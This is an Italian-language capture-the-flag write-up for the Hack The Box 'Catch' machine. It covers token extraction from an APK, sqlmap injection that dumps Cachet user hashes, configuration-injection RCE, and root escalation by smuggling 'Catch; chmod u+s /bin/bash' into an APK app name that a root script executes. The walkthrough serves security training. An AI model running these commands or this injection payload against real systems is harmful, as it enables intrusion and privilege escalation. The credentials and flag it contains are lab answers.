# Catch
* **POINTS**: 30
* **USER RATING**: Medium
* **OPERATING SYSTEM**: Linux
* **RATING**: 4.6

## 1. Recon
```shell
└─$ nmap -sC -sV -oA nmap/initial 10.10.11.150  
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-13 04:25 EDT
Nmap scan report for 10.10.11.150
Host is up (0.13s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Catch Global Systems
|_http-server-header: Apache/2.4.41 (Ubuntu)
3000/tcp open  ppp?
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: i_like_gitea=d36d87cc95b1efe3; Path=/; HttpOnly
|     Set-Cookie: _csrf=67WSJsARZfwsZ1k2eTito0hbvuc6MTY1NzcwMDc2NjM5NzE5NjI5MA; Path=/; Expires=Thu, 14 Jul 2022 08:26:06 GMT; HttpOnly; SameSite=Lax
|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Wed, 13 Jul 2022 08:26:06 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-">
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title> Catch Repositories </title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiQ2F0Y2ggUmVwb3NpdG9yaWVzIiwic2hvcnRfbmFtZSI6IkNhdGNoIFJlcG9zaXRvcmllcyIsInN0YXJ0X3VybCI6Imh0dHA6Ly9naXRlYS5jYXRjaC5odGI6MzAwMC8iLCJpY29ucyI6W3sic3JjIjoiaHR0cDovL2dpdGVhLmNhdGNoLmh0Yjoz
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Set-Cookie: i_like_gitea=f06012a5b3e75e5e; Path=/; HttpOnly
|     Set-Cookie: _csrf=WriyOEPiSJq9dEQlOCMZJ6m60wM6MTY1NzcwMDc3MjE1MTI0MjE0MA; Path=/; Expires=Thu, 14 Jul 2022 08:26:12 GMT; HttpOnly; SameSite=Lax
|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Wed, 13 Jul 2022 08:26:12 GMT
|_    Content-Length: 0
5000/tcp open  upnp?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, RTSPRequest, SMBProgNeg, ZendJavaBridge: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 302 Found
|     X-Frame-Options: SAMEORIGIN
|     X-Download-Options: noopen
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Content-Security-Policy: 
|     X-Content-Security-Policy: 
|     X-WebKit-CSP: 
|     X-UA-Compatible: IE=Edge,chrome=1
|     Location: /login
|     Vary: Accept, Accept-Encoding
|     Content-Type: text/plain; charset=utf-8
|     Content-Length: 28
|     Set-Cookie: connect.sid=s%3AtuskDiK0oNfmfrGcg7fW5iF-3UtpWNwG.p7etFIVKI44Er1PzAAMXBsV%2Bpy2Qkrx2a83MH4GTTVA; Path=/; HttpOnly
|     Date: Wed, 13 Jul 2022 08:26:11 GMT
|     Connection: close
|     Found. Redirecting to /login
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     X-Frame-Options: SAMEORIGIN
|     X-Download-Options: noopen
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Content-Security-Policy: 
|     X-Content-Security-Policy: 
|     X-WebKit-CSP: 
|     X-UA-Compatible: IE=Edge,chrome=1
|     Allow: GET,HEAD
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 8
|     ETag: W/"8-ZRAf8oNBS3Bjb/SU2GYZCmbtmXg"
|     Set-Cookie: connect.sid=s%3Agfi_HTyvs9IzZgVxEBmfUdlZD2s63rQC.fnGNyK76usONTf0D8ZdbEUeAlXcIcNzIgbc8peYw6bc; Path=/; HttpOnly
|     Vary: Accept-Encoding
|     Date: Wed, 13 Jul 2022 08:26:12 GMT
|     Connection: close
|_    GET,HEAD
8000/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Catch Global Systems
|_http-server-header: Apache/2.4.29 (Ubuntu)
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3000-TCP:V=7.92%I=7%D=7/13%Time=62CE819C%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,30E3,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\
SF:x20text/html;\x20charset=UTF-8\r\nSet-Cookie:\x20i_like_gitea=d36d87cc9
SF:5b1efe3;\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf=67WSJsARZfwsZ1k
SF:2eTito0hbvuc6MTY1NzcwMDc2NjM5NzE5NjI5MA;\x20Path=/;\x20Expires=Thu,\x20
SF:14\x20Jul\x202022\x2008:26:06\x20GMT;\x20HttpOnly;\x20SameSite=Lax\r\nS
SF:et-Cookie:\x20macaron_flash=;\x20Path=/;\x20Max-Age=0;\x20HttpOnly\r\nX
SF:-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Wed,\x2013\x20Jul\x202022\x20
SF:08:26:06\x20GMT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20c
SF:lass=\"theme-\">\n<head\x20data-suburl=\"\">\n\t<meta\x20charset=\"utf-
SF:8\">\n\t<meta\x20name=\"viewport\"\x20content=\"width=device-width,\x20
SF:initial-scale=1\">\n\t<meta\x20http-equiv=\"x-ua-compatible\"\x20conten
SF:t=\"ie=edge\">\n\t<title>\x20Catch\x20Repositories\x20</title>\n\t<link
SF:\x20rel=\"manifest\"\x20href=\"data:application/json;base64,eyJuYW1lIjo
SF:iQ2F0Y2ggUmVwb3NpdG9yaWVzIiwic2hvcnRfbmFtZSI6IkNhdGNoIFJlcG9zaXRvcmllcy
SF:IsInN0YXJ0X3VybCI6Imh0dHA6Ly9naXRlYS5jYXRjaC5odGI6MzAwMC8iLCJpY29ucyI6W
SF:3sic3JjIjoiaHR0cDovL2dpdGVhLmNhdGNoLmh0Yjoz")%r(Help,67,"HTTP/1\.1\x204
SF:00\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r
SF:\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(HTTPOptions,17F
SF:,"HTTP/1\.0\x20405\x20Method\x20Not\x20Allowed\r\nSet-Cookie:\x20i_like
SF:_gitea=f06012a5b3e75e5e;\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf
SF:=WriyOEPiSJq9dEQlOCMZJ6m60wM6MTY1NzcwMDc3MjE1MTI0MjE0MA;\x20Path=/;\x20
SF:Expires=Thu,\x2014\x20Jul\x202022\x2008:26:12\x20GMT;\x20HttpOnly;\x20S
SF:ameSite=Lax\r\nSet-Cookie:\x20macaron_flash=;\x20Path=/;\x20Max-Age=0;\
SF:x20HttpOnly\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Wed,\x2013\x2
SF:0Jul\x202022\x2008:26:12\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTS
SF:PRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20tex
SF:t/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20
SF:Request");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5000-TCP:V=7.92%I=7%D=7/13%Time=62CE81A2%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,23C,"HTTP/1\.1\x20302\x20Found\r\nX-Frame-Options:\x20SAMEORIG
SF:IN\r\nX-Download-Options:\x20noopen\r\nX-Content-Type-Options:\x20nosni
SF:ff\r\nX-XSS-Protection:\x201;\x20mode=block\r\nContent-Security-Policy:
SF:\x20\r\nX-Content-Security-Policy:\x20\r\nX-WebKit-CSP:\x20\r\nX-UA-Com
SF:patible:\x20IE=Edge,chrome=1\r\nLocation:\x20/login\r\nVary:\x20Accept,
SF:\x20Accept-Encoding\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\
SF:nContent-Length:\x2028\r\nSet-Cookie:\x20connect\.sid=s%3AtuskDiK0oNfmf
SF:rGcg7fW5iF-3UtpWNwG\.p7etFIVKI44Er1PzAAMXBsV%2Bpy2Qkrx2a83MH4GTTVA;\x20
SF:Path=/;\x20HttpOnly\r\nDate:\x20Wed,\x2013\x20Jul\x202022\x2008:26:11\x
SF:20GMT\r\nConnection:\x20close\r\n\r\nFound\.\x20Redirecting\x20to\x20/l
SF:ogin")%r(RTSPRequest,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnecti
SF:on:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP,2F,"HTTP/1\.1\x20400\x20B
SF:ad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(SMBProgNeg,2F,"HTTP/1
SF:\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(ZendJa
SF:vaBridge,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close
SF:\r\n\r\n")%r(HTTPOptions,241,"HTTP/1\.1\x20200\x20OK\r\nX-Frame-Options
SF::\x20SAMEORIGIN\r\nX-Download-Options:\x20noopen\r\nX-Content-Type-Opti
SF:ons:\x20nosniff\r\nX-XSS-Protection:\x201;\x20mode=block\r\nContent-Sec
SF:urity-Policy:\x20\r\nX-Content-Security-Policy:\x20\r\nX-WebKit-CSP:\x2
SF:0\r\nX-UA-Compatible:\x20IE=Edge,chrome=1\r\nAllow:\x20GET,HEAD\r\nCont
SF:ent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x208\r\nETa
SF:g:\x20W/\"8-ZRAf8oNBS3Bjb/SU2GYZCmbtmXg\"\r\nSet-Cookie:\x20connect\.si
SF:d=s%3Agfi_HTyvs9IzZgVxEBmfUdlZD2s63rQC\.fnGNyK76usONTf0D8ZdbEUeAlXcIcNz
SF:Igbc8peYw6bc;\x20Path=/;\x20HttpOnly\r\nVary:\x20Accept-Encoding\r\nDat
SF:e:\x20Wed,\x2013\x20Jul\x202022\x2008:26:12\x20GMT\r\nConnection:\x20cl
SF:ose\r\n\r\nGET,HEAD")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\x20Request
SF:\r\nConnection:\x20close\r\n\r\n")%r(DNSStatusRequestTCP,2F,"HTTP/1\.1\
SF:x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(Help,2F,"H
SF:TTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 112.17 seconds
```

### 1.1 Catch Global Systems - TCP 80
#
![page](Images/page.png)

L'unica cosa che funziona è il download dell'apk. Tramite [dex2jar](https://github.com/pxb1988/dex2jar/releases/tag/v2.1) trasformiamo l'apk in jar: `./d2j-dex2jar.sh ~/Scrivania/Catch/catchv1.0.apk`.

Una volta creato il jar, lo ho decompilato [online](http://www.javadecompilers.com) per avere i file *.java*.

In *MainActivity.java* si trova un URL:

```java
@Override
protected void onCreate(final Bundle bundle) {
    super.onCreate(bundle);
    this.setContentView(2131427356);
    (this.mywebView = this.findViewById(2131231125)).setWebViewClient(new WebViewClient());
    this.mywebView.loadUrl("https://status.catch.htb/");
    this.mywebView.getSettings().setJavaScriptEnabled(true);
}
```

### 1.2 Catch Repositories - TCP 3000
#
![gitea](Images/gitea.png)

Inoltre nel risultato di nmap abbiamo, sotto il tag *manifest*, un href encodato in base64 

```html
<link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiQ2F0Y2ggUmVwb3NpdG9yaWVzIiwic2hvcnRfbmFtZSI6IkNhdGNoIFJlcG9zaXRvcmllcyIsInN0YXJ0X3VybCI6Imh0dHA6Ly9naXRlYS5jYXRjaC5odGI6MzAwMC8iLCJpY29ucyI6W3sic3JjIjoiaHR0cDovL2dpdGVhLmNhdGNoLmh0Yjoz
```

```shell
└─$ echo "eyJuYW1lIjoiQ2F0Y2ggUmVwb3NpdG9yaWVzIiwic2hvcnRfbmFtZSI6IkNhdGNoIFJlcG9zaXRvcmllcyIsInN0YXJ0X3VybCI6Imh0dHA6Ly9naXRlYS5jYXRjaC5odGI6MzAwMC8iLCJpY29ucyI6W3sic3JjIjoiaHR0cDovL2dpdGVhLmNhdGNoLmh0Yjoz" | base64 -d
{"name":"Catch Repositories","short_name":"Catch Repositories","start_url":"http://gitea.catch.htb:3000/","icons":[{"src":"http://gitea.catch.htb:3
```

Aggiungiamo quindi tale sotto dominio in */etc/hosts*.

### 1.3 Let's chat - TCP 5000
#

<p align="center">
  <img src="Images/chat.png" />
</p>

Provando una SQLInj non fa nulla, quindi proviamo ad eseguire *gobuster* per capire se ci sono altri endpoint:

```shell
└─$ gobuster dir -u http://catch.htb:5000/ -w ~/Scaricati/SecLists/Discovery/Web-Content/common.txt                                                                                                                                   
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://catch.htb:5000/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/asd/Scaricati/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/07/13 06:25:15 Starting gobuster in directory enumeration mode
===============================================================
/Login                (Status: 200) [Size: 2622]
/Media                (Status: 301) [Size: 177] [--> /Media/]
/account              (Status: 401) [Size: 12]               
/connections          (Status: 401) [Size: 12]               
/files                (Status: 401) [Size: 12]               
/login                (Status: 200) [Size: 2622]             
/logout               (Status: 302) [Size: 28] [--> /login]  
/media                (Status: 301) [Size: 177] [--> /media/]
/messages             (Status: 401) [Size: 12]               
/robots.txt           (Status: 200) [Size: 25]               
/users                (Status: 401) [Size: 12]               
                                                             
===============================================================
2022/07/13 06:27:30 Finished
===============================================================
```

Andando però su *c* ci dice che non siamo autorizzati...

Utilizzando [MobSF](https://mobsf.github.io/Mobile-Security-Framework-MobSF/) analizziamo l'apk e nella sezione *Hardcoded Secret* troviamo dei token:

<p align="center">
  <img src="Images/MSFout.png" />
</p>

```
"gitea_token" : "b87bfb6345ae72ed5ecdcee05bcb34c83806fbd0"
"lets_chat_token" : "NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ=="
"slack_token" : "xoxp-23984754863-2348975623103"
```

Utilizziamo quindi il token trovato per autenticarci per capire cosa ci restuisce */users*: `curl -X GET "http://catch.htb:5000/users/" -H "Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ=="`

```json
[
  {
    "id": "61b86aead984e2451036eb16",
    "firstName": "Administrator",
    "lastName": "NA",
    "username": "admin",
    "displayName": "Admin",
    "avatar": "e2b5310ec47bba317c5f1b5889e96f04",
    "openRooms": [
      "61b86b28d984e2451036eb17",
      "61b86b3fd984e2451036eb18",
      "61b8708efe190b466d476bfb"
    ]
  },
  {
    "id": "61b86dbdfe190b466d476bf0",
    "firstName": "John",
    "lastName": "Smith",
    "username": "john",
    "displayName": "John",
    "avatar": "f5504305b704452bba9c94e228f271c4",
    "openRooms": [
      "61b86b3fd984e2451036eb18",
      "61b86b28d984e2451036eb17"
    ]
  },
  {
    "id": "61b86e40fe190b466d476bf2",
    "firstName": "Will",
    "lastName": "Robinson",
    "username": "will",
    "displayName": "Will",
    "avatar": "7c6143461e935a67981cc292e53c58fc",
    "openRooms": [
      "61b86b3fd984e2451036eb18",
      "61b86b28d984e2451036eb17"
    ]
  },
  {
    "id": "61b86f15fe190b466d476bf5",
    "firstName": "Lucas",
    "lastName": "NA",
    "username": "lucas",
    "displayName": "Lucas",
    "avatar": "b36396794553376673623dc0f6dec9bb",
    "openRooms": [
      "61b86b28d984e2451036eb17",
      "61b86b3fd984e2451036eb18"
    ]
  }
]
```

Nel sito abbiamo anche il [link al git](https://github.com/sdelements/lets-chat) di tale servizio; leggendo si è visto la presenza di *rooms* e andando ad indagare tra le varie room, si è scoperta la password di *john*: `curl -X GET "http://catch.htb:5000/rooms/61b86b28d984e2451036eb17/messages" -H "Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ=="`

```json
[...SNIPPET...]

  {
    "id": "61b8702dfe190b466d476bfa",
    "text": "Here are the credentials `john :  E}V!mywu_69T4C}W`",
    "posted": "2021-12-14T10:21:33.859Z",
    "owner": "61b86f15fe190b466d476bf5",
    "room": "61b86b28d984e2451036eb17"
  }

[...SNIPPET...]
```

### 1.4 status.catch.htb - TCP 8000
#

![cat](Images/status_page.png)

E in basso abbiamo un riferimento al [Github del sito](https://cachethq.io/) e anche un'ulteriore pagina *Dashbord* dove c'è una form di login:

<p align="center">
  <img src="Images/login.png" />
</p>

Provando a fare SQLInj non fa nulla.


## 2. SQLInj
Cercando su Google ho trovato un [articolo](https://www.leavesongs.com/PENETRATION/cachet-from-laravel-sqli-to-bug-bounty.html) nella quale si parla di SQLInj e fornisce anche il payload da provare:

### 2.1 PoC
#

```shell
─$ sqlmap -u "http://status.catch.htb:8000/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=or+%27a%27=%3F%20and%201=1)*+--+" --batch                                                                                                       
        ___
       __H__                                                                                                                                                                                                                                 
 ___ ___["]_____ ___ ___  {1.6.6#stable}                                                                                                                                                                                                     
|_ -| . ["]     | .'| . |                                                                                                                                                                                                                    
|___|_  [.]_|_|_|__,|  _|                                                                                                                                                                                                                    
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                 

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 05:21:19 /2022-07-13/

custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y
[05:21:20] [INFO] testing connection to the target URL
[05:21:20] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
[05:21:20] [INFO] testing if the target URL content is stable
[05:21:21] [INFO] target URL content is stable
[05:21:21] [INFO] testing if URI parameter '#1*' is dynamic
[05:21:21] [WARNING] URI parameter '#1*' does not appear to be dynamic
[05:21:21] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
[05:21:21] [INFO] testing for SQL injection on URI parameter '#1*'
[05:21:21] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[05:21:23] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[05:21:23] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[05:21:24] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[05:21:25] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[05:21:26] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[05:21:26] [INFO] testing 'Generic inline queries'
[05:21:26] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[05:21:27] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[05:21:28] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[05:21:28] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[05:21:39] [INFO] URI parameter '#1*' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[05:21:39] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[05:21:39] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[05:21:39] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[05:21:40] [INFO] target URL appears to have 1 column in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] N
[05:21:41] [WARNING] if UNION based SQL injection is not detected, please consider and/or try to force the back-end DBMS (e.g. '--dbms=mysql') 
[05:21:44] [INFO] target URL appears to be UNION injectable with 1 columns
[05:21:44] [INFO] checking if the injection point on URI parameter '#1*' is a false positive
URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 92 HTTP(s) requests:
---
Parameter: #1* (URI)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: http://status.catch.htb:8000/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=or+'a'=? and 1=1) AND (SELECT 9527 FROM (SELECT(SLEEP(5)))oRNU)+--+
---
[05:22:06] [INFO] the back-end DBMS is MySQL
[05:22:06] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
web server operating system: Linux Ubuntu 18.04 (bionic)
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.0.12
[05:22:06] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 74 times
[05:22:06] [INFO] fetched data logged to text files under '/home/asd/.local/share/sqlmap/output/status.catch.htb'

[*] ending @ 05:22:06 /2022-07-13/
```

Ci ricaviamo i DB: `sqlmap -u "http://status.catch.htb:8000/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=or+%27a%27=%3F%20and%201=1)*+--+" --batch --dbms mysql --thread 10 --dbs`

```mysql
available databases [5]:
[*] cachet
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
```

Ci ricaviamo le tabelle di *cachet*: `sqlmap -u "http://status.catch.htb:8000/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=or+%27a%27=%3F%20and%201=1)*+--+" --batch --dbms mysql --thread 10 -D cachet --tables`

```mysql
Database: cachet
[25 tables]
+---------------------+
| actions             |
| cache               |
| component_groups    |
| components          |
| failed_jobs         |
| incident_components |
| incident_templates  |
| incident_updates    |
| incidents           |
| invites             |
| jobs                |
| meta                |
| metric_points       |
| metrics             |
| migrations          |
| notifications       |
| schedule_components |
| schedules           |
| sessions            |
| settings            |
| subscribers         |
| subscriptions       |
| taggables           |
| tags                |
| users               |
+---------------------+
```

Ci ricaviamo il nome delle colonne della tabella *users*: `sqlmap -u "http://status.catch.htb:8000/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=or+%27a%27=%3F%20and%201=1)*+--+" --batch --dbms mysql --thread 10 -D cachet -T users --dump` 

```mysql
[05:50:21] [INFO] retrieved: id
[05:50:30] [INFO] retrieved: username
[05:51:01] [INFO] retrieved: password
[05:51:38] [INFO] retrieved: remember_token
[05:52:39] [INFO] retrieved: google_2fa_secret
[05:54:00] [INFO] retrieved: email
[05:54:18] [INFO] retrieved: api_key
[05:54:51] [INFO] retrieved: active
[05:55:14] [INFO] retrieved: level
[05:55:37] [INFO] retrieved: welcomed
[05:56:11] [INFO] retrieved: created_at
[05:56:52] [INFO] retrieved: updated_at
```

Vediamo di ricavarci le info riferite a *username, password, email, api_key*: `sqlmap -u "http://status.catch.htb:8000/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=or+%27a%27=%3F%20and%201=1)*+--+" --batch --dbms mysql --thread 10 -D cachet -T users -C username,password,email,api_key --dump`

```mysql
Database: cachet
Table: users
[2 entries]
+----------+--------------------------------------------------------------+-----------------+----------------------+
| username | password                                                     | email           | api_key              |
+----------+--------------------------------------------------------------+-----------------+----------------------+
| admin    | $2y$10$quY5ttamPWVo54lbyLSWEu00A/tkMlqoFaEKwJSWPVGHpVK2Wj7Om | admin@catch.htb | rMSN8kJN9TPADl2cWv8N |
| john     | $2y$10$2jcDURPAEbv2EEKto0ANb.jcjgiAwWzkwzZKNT9fUpOziGjJy5r8e | john@catch.htb  | 7GVCqTY5abrox48Nct8j |
+----------+--------------------------------------------------------------+-----------------+----------------------+
```

## 3. RCE
Con le credenziali trovate in precedenza, ci autentichiamo su `http://status.catch.htb:8000/auth/login` 

![dash](Images/dash.png)

In *Settings* abbiamo anche la versione di *Cachet* -> cercando su Google ho trovato un [artcolo](https://blog.sonarsource.com/cachet-code-execution-via-laravel-configuration-injection) nel quale parla di RCE e ci indica anche come effettuare il leak della password del DB:

<p align="center">
  <img src="Images/rce.png" />
</p>

Facendo *Save* e ricaricando la pagina avremo la password:

<p align="center">
  <img src="Images/pss.png" />
</p>

Usiamo tale password per accedere al servizio SSH. 

```shell
└─$ ssh will@10.10.11.150
will@10.10.11.150's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-104-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 13 Jul 2022 01:47:01 PM UTC

  System load:                      0.0
  Usage of /:                       71.9% of 16.61GB
  Memory usage:                     86%
  Swap usage:                       27%
  Processes:                        440
  Users logged in:                  0
  IPv4 address for br-535b7cf3a728: 172.18.0.1
  IPv4 address for br-fe1b5695b604: 172.19.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.11.150
  IPv6 address for eth0:            dead:beef::250:56ff:feb9:6b86


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

will@catch:~$
```

Quindi abbiamo la user flag: `0439645cebda901f055ed608f59f201d`

## 4. Privilege Escalation
Caricando *pspy* si nota l'esecuzione di `verify.sh`, uno script da noi consultabile:

<p align="center">
  <img src="Images/pspy.png" />
</p>

Nello script abbiamo una funzione usata per fare il check delle app:

```bash
####################
# Basic App Checks #
####################

app_check() {
        APP_NAME=$(grep -oPm1 "(?<=<string name=\"app_name\">)[^<]+" "$1/res/values/strings.xml")
        echo $APP_NAME
        if [[ $APP_NAME == *"Catch"* ]]; then
                echo -n $APP_NAME|xargs -I {} sh -c 'mkdir {}'
                mv "$3/$APK_NAME" "$2/$APP_NAME/$4"
        else
                echo "[!] App doesn't belong to Catch Global"
                cleanup
                exit
        fi
}
```

Quindi possiamo manipolare `APP_NAME`: basta mettere una *apk*, che ha come *app_name* il comando che vogliamo far eseguire, in */opt/mdm/apk_bin* (c'è lo dice sempre lo script *verify.sh*)

```bash
###################
# MDM CheckerV1.0 #
###################

DROPBOX=/opt/mdm/apk_bin
IN_FOLDER=/root/mdm/apk_bin
OUT_FOLDER=/root/mdm/certified_apps
PROCESS_BIN=/root/mdm/process_bin

for IN_APK_NAME in $DROPBOX/*.apk;do
        OUT_APK_NAME="$(echo ${IN_APK_NAME##*/} | cut -d '.' -f1)_verified.apk"
        APK_NAME="$(openssl rand -hex 12).apk"
        if [[ -L "$IN_APK_NAME" ]]; then
                exit
        else
                mv "$IN_APK_NAME" "$IN_FOLDER/$APK_NAME"
        fi
        sig_check $IN_FOLDER $APK_NAME
        comp_check $IN_FOLDER $APK_NAME $PROCESS_BIN
        app_check $PROCESS_BIN $OUT_FOLDER $IN_FOLDER $OUT_APK_NAME
done
```

Decompiliamo nella macchina host con `apktool d catchv1.0.apk` e modifichiamo il file */res/values/strings.xml* 

```xml
<string name="app_name">Catch; chmod u+s /bin/bash</string>
```

Andando a ricompilare con `apktool b catchv1.0/` mi da errori e cercando su Google ho trovato un [articolo](https://ibotpeaches.github.io/Apktool/build/) nella quale si spiega come bypassare questo problema e ci da un [git](https://github.com/iBotPeaches/Apktool) dal quale mi sono scaricato il *jar*.

Quindi in locale ho decompilato l'apk con il comando `java -jar apktool_2.6.1.jar d catchv1.0.apk`, ho modificato il file di cui prima e ricompilato con il comando `java -jar apktool_2.6.1.jar b catchv1.0/ -o asd.apk`.

